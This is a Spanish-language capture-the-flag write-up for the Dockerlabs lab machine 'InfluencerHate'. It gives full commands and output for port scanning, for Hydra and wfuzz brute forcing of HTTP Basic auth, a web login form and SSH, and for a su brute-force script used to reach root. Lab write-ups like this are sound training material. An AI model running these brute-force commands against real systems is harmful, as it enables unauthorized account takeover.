
# Writeup Template: Maquina `[ InfluencerHate ]`

- Tags: #InfluencerHate #httpBasicAuth
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina InfluencerHate](https://mega.nz/file/yNMX1RAS#HXQMccqjMmCrGcrSDy4nOmo9-NYjUm5qA4lbKy9OF2s) Fuerza bruta en formulario web de apache y después otra forma de fuerza bruta en formulario de login web.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x influencerhate.zip
sudo bash auto_deploy.sh influencerhate.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
172.17.0.2
```

Al ingresar tenemos un panel de inicio de sesion de **js** al cual aplicaremos fuerza bruta, Pero primero tenemos que interceptar la peticion para saber como es que se esta tramitando la peticion:
```bash
# Unauthorized
This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required.
Apache/2.4.62 (Debian) Server at 172.17.0.2 Port 80
```

Ya que con burpuite no permite capturar la peticon tenemos que saber como es que funciona la AutentificaconHTTPBasic
**Autenticación HTTP Basic** es un método simple y ampliamente utilizado para controlar el acceso a recursos web. Funciona mediante el envío de credenciales (usuario y contraseña) en cada solicitud HTTP.
### **¿Cómo funciona?**
1. **Solicitud del cliente**:  
    Un cliente (navegador, app, etc.) intenta acceder a un recurso protegido (ej. una URL).
2. **Respuesta del servidor (si no está autenticado)**:  
    El servidor responde con un código de estado **`401 Unauthorized`** y agrega la cabecera:
```bash
WWW-Authenticate: Basic realm="Área Protegida"
```
Esto indica que se requiere autenticación básica.
3. **Credenciales del cliente**:  
    El cliente pide al usuario su nombre y contraseña, los combina en el formato `usuario:contraseña`, y los **codifica en Base64**.  
    Ejemplo:
    - Credenciales: `admin:123` → Base64: `YWRtaW46MTIz`
#### **Nueva solicitud con autorización**:  
El cliente incluye la credencial codificada en la cabecera:
```bash
Authorization: Basic YWRtaW46MTIz
```
#### 4. **Verificación del servidor**:  
    El servidor decodifica Base64, verifica las credenciales y permite o deniega el acceso.

### **Seguridad y Riesgos**
- 🚨 **No es seguro por sí solo**:  
    Las credenciales codificadas en **Base64 no están cifradas** (cualquiera puede decodificarlas fácilmente).  
    Ejemplo: `YWRtaW46MTIz` → `admin:123` (usando [base64decode.org](https://www.base64decode.org/)).
- 🔐 **Requiere HTTPS**:  
    Para evitar robos de credenciales, **siempre debe usarse con HTTPS** (cifra la comunicación).
- ⚠️ **Vulnerabilidades**:
    - Sin HTTPS, es susceptible a ataques _Man-in-the-Middle_.
    - No protege contra ataques de repetición (_replay attacks_).
    - El cliente guarda credenciales en caché (hasta cerrar el navegador).

## Ataque HTTP Basic:
Para realizar un ataque de **fuerza bruta a autenticación HTTP Basic** usando el formato `usuario:contraseña` (como `admin:admin`) con **SecLists** necesitamos esto:
### **1. Archivos clave en SecLists**
Busca estos archivos en el directorio de SecLists (normalmente en `/usr/share/seclists` o `~/SecLists`):

| Ruta en SecLists                                                    | Contenido                                                                              |
| ------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| **`/Passwords/Default-Credentials/avaya_defaultpasslist.txt`**      | **El más útil**. Contiene combinaciones comunes como `admin:admin`, `root:12345`, etc. |
| **`Passwords/Default-Credentials/default-http-auth-passwords.txt`** | Específico para credenciales HTTP.                                                     |
| `Passwords/Common-Credentials/top-20-common-SSH-passwords.txt`      | Incluye pares como `admin:admin` (no es exclusivo de SSH).                             |
| `Passwords/Common-Credentials/best110.txt`                          | Combinaciones cortas populares.                                                        |
Tenemos que revisar que todos tenga ese formato que necesitamos para realizar el ataque de fuerza bruta, Y una ves revisado los unificaremos en un solo archivo como diccionario para realizar el ataque de fuerza bruta
Para nuestro ataque unificamos estos dos diccionarios:
**( xcp )** Es un alias del comandos **xclip -sel clip**
```bash
cat /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt | xcp
cat /usr/share/SecLists/Passwords/Default-Credentials/avaya_defaultpasslist.txt | xcp
```

Para al final quedando un diccionario bajo el nombre de **http_basic_aut.txt**
Ahora el primer intento lo realizaremos con **hydra**
```bash
hydra -C http_basic_aut.txt 172.17.0.2 -s 80 http-get /
```

Con **hydra** logramos obtener las credenciales de acceso:
```bash
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
```

Ahora estas credenciales las tendremos que usar para logueranos en el panel **HttpBasicAuth**
### Tecnologías Detectadas
Una ves ingresadas las credenciales ahora si podemos ver el contenido del servicio:

Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
http://172.17.0.2 [401 Unauthorized] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[401 Unauthorized], WWW-Authenticate[Zona restringida][Basic]
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10 -U httpadmin -P fhttpadmin
```

**Hallazgos Relevantes:**
	No reporto nada.

### Descubrimiento de Archivos
```bash
wfuzz -c -z file,/usr/share/SecLists/Discovery//directory-list-2.3-medium.txt -z list,php,txt,htmljs,java,txt,sh --hc 401,403,404 --basic httpadmin:fhttpadmin http://172.17.0.2/FUZZ.FUZ2Z
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 10 -x php,php.back,backup,txt,sh,html,py,js,java -U httpadmin -P fhttpadmin
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una ves ganado el acceso al panel lo enumeramos totalmente para encontrar posibles filtraciones o fallas de seguridad que nos permitan ganar acceso al objetivo

estamos en esta seccion que es un panel de login para inicio de sesion, Lo primero que aremos es interceptar la peticion con **burpsuite** para ver como se tramitando los datos:
```bash
http://172.17.0.2/login.php
```

Tenemos una peticion que se esta realizando mediante **POST**
```bash
POST /login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
Connection: keep-alive
Referer: http://172.17.0.2/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```

Logramos ver que efectivamente existe la cabecera
```bash
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
``` 
### Ejecucion del Ataque
La que un un principio no pidimos interceptar, Ahora podemos usarlo a nuestro favor para realizar un ataque de fuerza bruta con **wfuzz** al panel de autentificacion con las cabeceras **HTTP**:
```bash
# Comandos para explotación
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -t 50 --hh=2848 -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" http://172.17.0.2/login.php
```

Credenciales encontradas:
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000027:   200        84 L     236 W      2924 Ch     "chocolate"
000000115:   200        84 L     226 W      2848 Ch     "adrian" 
```

Ahora que tenemos las credenciales del usuario **administrador** nos conectaremos a su panel administrativo:
```bash
username: admin
password: chocolate
```

Tenemos este mensaje de bienvenida que nos da pista de otro posible usuario:
```bash
¡Login correcto! **Enhorabuena! De parte del usuario balutin, te damos la enhorabuena**
```

Ahora que sabemos que existe un potencial usuario **balutin** realizaremos un ataque de fuerza bruta al protocolo **ssh** para encontras sus credenciales correctas:
```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2
```

Tenemos las credenciales de acceso:
```bash
[STATUS] 84.00 tries/min, 84 tries in 00:01h, 14344314 to do in 2846:06h, 4 active
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh balutin@172.17.0.2 # ( estrella )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
balutin@3df40de16f5f:~$ sudo -l
-bash: sudo: command not found

balutin@3df40de16f5f:~$ id
uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)

balutin@3df40de16f5f:~$ ls -la /opt/   
total 8
drwxr-xr-x  2 root root 4096 Jun 10 00:00 .
drwxr-xr-x 17 root root 4096 Jul  4 17:30 ..

balutin@3df40de16f5f:~$ ls -la /tmp 
total 8
drwxrwxrwt  2 root root 4096 Jul  4 17:30 .
drwxr-xr-x 17 root root 4096 Jul  4 17:30 ..

find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
```
### Explotacion de Privilegios

###### Usuario `[ balutin ]`:
Dato que solo existe un usuario mas en el sistema que es el **privilegiado** tendremos que aplicar fuerza bruta, Tendremos que transferir dos herramientas para esto:
**LInux-Su-Force** Herramienta para fuerza bruta de usarios, Desarrollada por el **hacker** **Pinguino De Mario**
**Rockyou** Diccionario con millones de contrasenas.
```bash
  Linux-Su-Force.sh   rockyou.txt
```

Ahora lo que tendremos que hacer es montarnos un servidor con python para dejar disponibles estas herramientas, Cuando realizamos la peticion desde la maquina victima
```bash
python3 -m http.server 80
```

Revisando que la maquina victima no tiene **( nc | curl | wget  )** realizaremos la transferencia por ssh ya que tenemos las claves de acceso:
```bash
❯ scp Linux-Su-Force.sh balutin@172.17.0.2:/home/balutin
balutin@172.17.0.2's password: # ( estrella )
Linux-Su-Force.sh 
```

```bash
❯ scp rockyou.txt balutin@172.17.0.2:/home/balutin

balutin@172.17.0.2's password: # ( estrella ) 
rockyou.txt
```

Ya teniendo las herramientas transferidas en la maquina victima procedemos a dar permisos de ejecucion:
```bash
chmod +x Linux-Su-Force.sh 
```

Ahora si iniciamos el ataque de fuerza bruta para el usuario privilegiado **root**
```bash
bash Linux-Su-Force.sh root rockyou.txt
```

Tenemos las credenciales de usuario administrador
```bash
Contraseña encontrada para el usuario root: rockyou
balutin@3df40de16f5f:~$
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
su root # ( rockyou )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@3df40de16f5f:/home/balutin# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a realizar fuerza bruta a un panel de **HTTPBasicAuth**
2. Aprendimos a realizar fuerza bruta a otro panel pero web arrastrando las cabeceras **HTTP** para que nos tomara como logueados.